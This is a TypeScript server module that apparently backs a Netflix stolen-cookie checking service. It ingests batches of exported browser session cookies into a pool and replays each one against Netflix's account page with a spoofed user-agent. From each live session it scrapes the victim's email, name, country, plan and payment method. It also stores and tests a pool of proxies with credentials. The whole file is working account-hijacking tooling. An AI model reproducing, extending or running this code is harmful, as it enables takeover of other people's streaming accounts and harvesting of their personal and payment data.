import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { z } from "zod";
import { createHash } from "crypto";

async function assertAdmin(supabase: any, userId: string) {
  const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
  if (!isAdmin) throw new Error("Forbidden");
}
async function assertStaff(supabase: any, userId: string) {
  const [{ data: a }, { data: m }] = await Promise.all([
    supabase.rpc("has_role", { _user_id: userId, _role: "admin" }),
    supabase.rpc("has_role", { _user_id: userId, _role: "moderator" }),
  ]);
  if (!a && !m) throw new Error("Forbidden");
}

// -------------------- Cookie parsing --------------------

type CookiePair = { name: string; value: string; domain?: string };

function parseCookieBlob(raw: string): CookiePair[] {
  raw = raw.trim();
  if (!raw) return [];
  // JSON array (EditThisCookie / Cookie-Editor export)
  if (raw.startsWith("[") || raw.startsWith("{")) {
    try {
      const j = JSON.parse(raw);
      const arr = Array.isArray(j) ? j : Array.isArray(j.cookies) ? j.cookies : [];
      return arr
        .map((c: any) => ({ name: String(c.name ?? ""), value: String(c.value ?? ""), domain: c.domain }))
        .filter((c: CookiePair) => c.name && c.value);
    } catch { /* fall through */ }
  }
  const out: CookiePair[] = [];
  const lines = raw.split(/\r?\n/);
  // Netscape: domain \t flag \t path \t secure \t expiry \t name \t value
  if (lines.some((l) => l.split("\t").length >= 7)) {
    for (const line of lines) {
      if (!line || line.startsWith("#")) continue;
      const parts = line.split("\t");
      if (parts.length < 7) continue;
      out.push({ domain: parts[0], name: parts[5], value: parts.slice(6).join("\t") });
    }
    return out.filter((c) => c.name && c.value);
  }
  // Header style: "a=1; b=2; c=3"
  const flat = raw.replace(/\n/g, "; ");
  for (const seg of flat.split(";")) {
    const eq = seg.indexOf("=");
    if (eq < 1) continue;
    const name = seg.slice(0, eq).trim();
    const value = seg.slice(eq + 1).trim();
    if (name && value) out.push({ name, value });
  }
  return out;
}

function cookieHeader(pairs: CookiePair[]): string {
  return pairs.map((c) => `${c.name}=${c.value}`).join("; ");
}

function fingerprintOf(pairs: CookiePair[]): string {
  const key = pairs.find((c) => c.name === "NetflixId")?.value ?? pairs.map((c) => `${c.name}=${c.value}`).sort().join("|");
  return createHash("sha256").update(key).digest("hex").slice(0, 32);
}

// -------------------- Netflix cookie check --------------------

type CheckOutcome = {
  status: "active" | "on_hold" | "free" | "invalid";
  is_valid: boolean;
  email?: string | null;
  country?: string | null;
  plan_name?: string | null;
  video_quality?: string | null;
  name?: string | null;
  payment_method?: string | null;
};

async function checkNetflixCookie(pairs: CookiePair[]): Promise<CheckOutcome> {
  try {
    const res = await fetch("https://www.netflix.com/YourAccount", {
      headers: {
        cookie: cookieHeader(pairs),
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml",
        "accept-language": "en-US,en;q=0.9",
      },
      redirect: "follow",
    });
    const finalUrl = res.url;
    const html = await res.text();
    if (finalUrl.includes("/login") || finalUrl.includes("/Login")) {
      return { status: "invalid", is_valid: false };
    }
    if (/membership.*on.?hold|account.*hold/i.test(html)) {
      return { status: "on_hold", is_valid: false };
    }
    const pick = (re: RegExp) => (html.match(re)?.[1] ?? "").trim() || null;
    const email = pick(/"emailAddress"\s*:\s*"([^"]+)"/i) ?? pick(/data-uia="account-email"[^>]*>([^<]+)</i);
    const plan = pick(/"planName"\s*:\s*"([^"]+)"/i) ?? pick(/current[- ]plan[^>]*>\s*<[^>]+>([^<]+)</i);
    const country = pick(/"countryOfSignup"\s*:\s*"([^"]+)"/i);
    const quality = pick(/"videoQuality"\s*:\s*"([^"]+)"/i);
    const name = pick(/"firstName"\s*:\s*"([^"]+)"/i);
    const pay = pick(/"paymentMethod"\s*:\s*"([^"]+)"/i);
    const free = /free\s*trial|start\s*your\s*free\s*month/i.test(html);
    return {
      status: free ? "free" : "active",
      is_valid: true,
      email,
      country,
      plan_name: plan,
      video_quality: quality,
      name,
      payment_method: pay,
    };
  } catch (e) {
    console.error("[cookie-check]", e);
    return { status: "invalid", is_valid: false };
  }
}

// -------------------- Cookie server functions --------------------

const UploadInput = z.object({
  label: z.string().max(120).optional().default(""),
  blobs: z.array(z.string()).min(1).max(200), // one blob = one account
});

export const uploadCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => UploadInput.parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    let inserted = 0, duplicates = 0, invalid = 0;
    for (const blob of data.blobs) {
      const pairs = parseCookieBlob(blob);
      if (pairs.length === 0) { invalid++; continue; }
      const fp = fingerprintOf(pairs);
      const { data: dup } = await supabaseAdmin.from("cookie_pool").select("id").eq("fingerprint", fp).maybeSingle();
      if (dup) { duplicates++; continue; }
      const { error } = await supabaseAdmin.from("cookie_pool").insert({
        label: data.label || null,
        cookies_json: pairs,
        fingerprint: fp,
        status: "unknown",
        is_valid: false,
        uploaded_by: userId,
      });
      if (error) { invalid++; continue; }
      inserted++;
    }
    await supabaseAdmin.from("admin_activity_log").insert({
      admin_id: userId, action: "cookie.upload", details: { inserted, duplicates, invalid },
    });
    return { inserted, duplicates, invalid };
  });

const ListCookiesInput = z.object({
  page: z.number().int().min(0).default(0),
  pageSize: z.number().int().min(10).max(200).default(50),
  status: z.string().optional(),
});

export const listCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => ListCookiesInput.parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    await assertStaff(supabase, userId);
    let q = supabase
      .from("cookie_pool")
      .select("id,label,email,country,plan_name,video_quality,name,payment_method,status,is_valid,total_uses,success_count,fail_count,last_used_at,last_checked_at,created_at", { count: "exact" })
      .order("created_at", { ascending: false })
      .range(data.page * data.pageSize, data.page * data.pageSize + data.pageSize - 1);
    if (data.status) q = q.eq("status", data.status);
    const { data: rows, count, error } = await q;
    if (error) throw error;
    return { rows: rows ?? [], count: count ?? 0 };
  });

export const deleteCookie = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin.from("cookie_pool").delete().eq("id", data.id);
    await supabaseAdmin.from("admin_activity_log").insert({ admin_id: userId, action: "cookie.delete", details: { id: data.id } });
    return { ok: true };
  });

export const checkCookieNow = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    await assertStaff(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: row, error } = await supabaseAdmin.from("cookie_pool").select("cookies_json").eq("id", data.id).single();
    if (error || !row) throw new Error("Not found");
    const outcome = await checkNetflixCookie(row.cookies_json as CookiePair[]);
    await supabaseAdmin.from("cookie_pool").update({
      status: outcome.status,
      is_valid: outcome.is_valid,
      email: outcome.email ?? null,
      country: outcome.country ?? null,
      plan_name: outcome.plan_name ?? null,
      video_quality: outcome.video_quality ?? null,
      name: outcome.name ?? null,
      payment_method: outcome.payment_method ?? null,
      last_checked_at: new Date().toISOString(),
    }).eq("id", data.id);
    return outcome;
  });

export const checkAllCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: rows } = await supabaseAdmin.from("cookie_pool").select("id, cookies_json").limit(500);
    let checked = 0, active = 0, invalid = 0;
    for (const r of rows ?? []) {
      const o = await checkNetflixCookie(r.cookies_json as CookiePair[]);
      await supabaseAdmin.from("cookie_pool").update({
        status: o.status, is_valid: o.is_valid,
        email: o.email ?? null, country: o.country ?? null, plan_name: o.plan_name ?? null,
        video_quality: o.video_quality ?? null, name: o.name ?? null, payment_method: o.payment_method ?? null,
        last_checked_at: new Date().toISOString(),
      }).eq("id", r.id);
      checked++;
      if (o.status === "active") active++;
      if (o.status === "invalid") invalid++;
    }
    await supabaseAdmin.from("admin_activity_log").insert({ admin_id: userId, action: "cookie.check_all", details: { checked, active, invalid } });
    return { checked, active, invalid };
  });

// -------------------- Proxy parsing --------------------

type ProxyRow = { raw: string; scheme: string; ip: string; port: string; username?: string | null; password?: string | null };

function parseProxyLine(line: string): ProxyRow | null {
  line = line.trim();
  if (!line) return null;
  let scheme = "http";
  let rest = line;
  const m = line.match(/^(https?|socks[45]):\/\/(.+)$/i);
  if (m) { scheme = m[1].toLowerCase(); rest = m[2]; }
  let user: string | null = null, pass: string | null = null;
  const at = rest.lastIndexOf("@");
  if (at >= 0) {
    const auth = rest.slice(0, at);
    rest = rest.slice(at + 1);
    const c = auth.indexOf(":");
    if (c >= 0) { user = auth.slice(0, c); pass = auth.slice(c + 1); }
    else user = auth;
  }
  // ip:port  OR  ip:port:user:pass
  const parts = rest.split(":");
  if (parts.length === 2) return { raw: line, scheme, ip: parts[0], port: parts[1], username: user, password: pass };
  if (parts.length === 4) return { raw: line, scheme, ip: parts[0], port: parts[1], username: parts[2], password: parts[3] };
  return null;
}

export const uploadProxies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ text: z.string().max(500_000) }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    let inserted = 0, invalid = 0, duplicates = 0;
    for (const line of data.text.split(/\r?\n/)) {
      const p = parseProxyLine(line);
      if (!p) { if (line.trim()) invalid++; continue; }
      const { data: dup } = await supabaseAdmin.from("proxy_pool").select("id").eq("raw", p.raw).maybeSingle();
      if (dup) { duplicates++; continue; }
      const { error } = await supabaseAdmin.from("proxy_pool").insert(p);
      if (error) invalid++; else inserted++;
    }
    await supabaseAdmin.from("admin_activity_log").insert({ admin_id: userId, action: "proxy.upload", details: { inserted, invalid, duplicates } });
    return { inserted, invalid, duplicates };
  });

export const listProxies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ page: z.number().int().min(0).default(0), pageSize: z.number().int().min(10).max(200).default(50) }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    await assertStaff(supabase, userId);
    const { data: rows, count, error } = await supabase
      .from("proxy_pool")
      .select("*", { count: "exact" })
      .order("created_at", { ascending: false })
      .range(data.page * data.pageSize, data.page * data.pageSize + data.pageSize - 1);
    if (error) throw error;
    return { rows: rows ?? [], count: count ?? 0 };
  });

export const deleteProxy = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin.from("proxy_pool").delete().eq("id", data.id);
    return { ok: true };
  });

export const checkAllProxies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: rows } = await supabaseAdmin.from("proxy_pool").select("id, scheme, ip, port").limit(500);
    let valid = 0, invalid = 0;
    // NOTE: Worker runtime cannot tunnel through arbitrary HTTP/SOCKS proxies for outbound fetches.
    // We only sanity-check reachability of the proxy host:port from the edge and log the result.
    for (const p of rows ?? []) {
      let ok = false, err: string | null = null;
      try {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), 5000);
        // Attempt a lightweight TCP-ish reach via HTTP — best-effort.
        await fetch(`http://${p.ip}:${p.port}`, { signal: c.signal }).catch((e) => { err = String(e?.message || e); });
        clearTimeout(t);
        ok = !err;
      } catch (e: any) { err = String(e?.message || e); }
      await supabaseAdmin.from("proxy_pool").update({
        is_valid: ok, last_error: err, last_checked_at: new Date().toISOString(),
      }).eq("id", p.id);
      if (ok) valid++; else invalid++;
    }
    return { valid, invalid };
  });
